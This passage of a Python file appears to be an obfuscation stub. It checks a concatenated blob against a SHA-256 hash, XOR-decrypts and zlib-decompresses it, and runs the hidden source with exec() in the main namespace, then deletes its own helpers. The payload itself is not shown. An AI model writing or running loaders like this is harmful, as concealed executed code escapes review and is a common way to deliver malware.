_co63GZ7bCsmn4a + _coxJdNHtXvCesQ + _caPqapGypfJlI6 + _clt2Js3fPQZSY8 + _cs2e3zP3PHJEOU + _clm1TU7OWrTCK8 + _cjkjxiYUssGp4z + _cb_fSF8UgaJEp9 + _cvmbOITaSsPyqn + _cztFJBoOjYJ3q1 + _cwmoPw0gz1Vkw3 + _cvPt3Rpb0wpt6A + _ci5UXJET894HMJ + _cgIST4DBCEUVUK + _cleW6mMlvLroD2 + _cxDh7OkuaRDG9O + _cnGnyf0lNyGInS + _caBOy2G1huNNem + _chMMAMghJICIsz + _c_Go0owzegls4y + _co3CzEqs7PpnC_ + _ciN0bpg3NdoWvR + _cw1zkWWYO6OIGq + _cfAckFmaJy89WR + _cvn0zIWG0Tc_Cq + _cv9aDjo8DXQocR + _ciCnQFhe7QIrVg + _clwNcNhaWOD6gd + _caHc_BECQcuEbc + _ckPdZS6fmKaskQ + _cdsxYHPy76KLzg + _cg8jXPVjkTgVht + _czt4eKXiEDoNrr + _ccJTg7ks9ygHWU + _cw8ul0RluxEi1x + _cxA5X6CmZa8rwT + _cm7YVdwBz7XmpQ + _ckotU1Gh107nYe + _cxzTFr7TXAs4my + _ccq52xXIRrlyge + _cpDsazygM4rD5J + _cwomjLSm37aTjE + _cjNZmuDi7yB47J + _cwyDCO8Y6ewsbc + _cpIF0ntRkX7_3O + _cxaZTrlMHF6fFO + _cwerFgXqP5R6ap + _cwE0z1WYy0sGo3 + _cdpImWwW0X77iU + _cddYxytqxhgtl8 + _csvEsthGYhWV6X + _cwmPNlDtuWKunn + _co_y7vsFbNGvJs + _ctYnZM42A21F19 + _cggfAg3CzVsubO + _cj8VCjsR2YlIrh + _cuRlDcOf7OXSYw + _ctSg70MMZDOoCb + _ckiMyC4JBmKJ9N + _cwb9JyYUQrZCmY + _cgOxaEJA1Jez0I + _cwuak1EcAf8jLu + _cqXNf8oavV8zQm + _cjNpEw6q8l8Be7 + _cqqukXcdSQUqkU + _cvzAVezMr3Sg7_ + _cpiAGsS_VHZp_r + _cu0x7Nyv2iLw1P + _cf5hhWR_j4PkaJ)
if __import__('hashlib').sha256(_pq4m8JMjlZ5ddg).hexdigest() != '46b92db1ea3159d5eed5b93b4cf492e5933987acaa7d86a37e9ad375b2f2703e':
    __import__('sys').exit(1)
_xxu5F0nx01FxHW = bytes([86, 234, 217, 84, 25, 205, 107, 97, 166, 167, 59, 239, 23, 223, 196, 25, 10, 86, 29, 193, 97, 175, 42, 35])
_fkbz5CrJNuEQTWD = bytes([170, 104, 38, 96, 112, 122, 180, 118, 107, 19, 107, 155, 61, 58, 85, 34, 97, 72, 174, 126, 58, 25, 58, 214])

def _fxhHfAod9aImIVo(_ba6lwFHik8gWjb, _kzO_2DhPvO7a7x):
    return bytes(_ba6lwFHik8gWjb[_iqOlSLj9826XeL] ^ _kzO_2DhPvO7a7x[_iqOlSLj9826XeL % len(_kzO_2DhPvO7a7x)] for _iqOlSLj9826XeL in range(len(_ba6lwFHik8gWjb)))

def _fdiTMqivVsfr4ou(_towxEMSmEOEQSU):
    import zlib
    return zlib.decompress(_towxEMSmEOEQSU) # Un seul niveau de zlib ici pour simplifier

def _fenZ7_oZ1ehi8ig():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xfVSnRbEi3B5sm = _fxhHfAod9aImIVo(_pq4m8JMjlZ5ddg, _xxu5F0nx01FxHW)
    # 2. Décompression Zlib
    _dtECs9vRdAz5Ie = _fdiTMqivVsfr4ou(_xfVSnRbEi3B5sm)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dtECs9vRdAz5Ie.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _ngjvuFwxSY0qfI = _main.__dict__
    _ngjvuFwxSY0qfI.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _ngjvuFwxSY0qfI)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_fenZ7_oZ1ehi8ig()
try:
    del _fxhHfAod9aImIVo, _fdiTMqivVsfr4ou, _fenZ7_oZ1ehi8ig
    del _pq4m8JMjlZ5ddg, _xxu5F0nx01FxHW, _fkbz5CrJNuEQTWD
except:
    pass
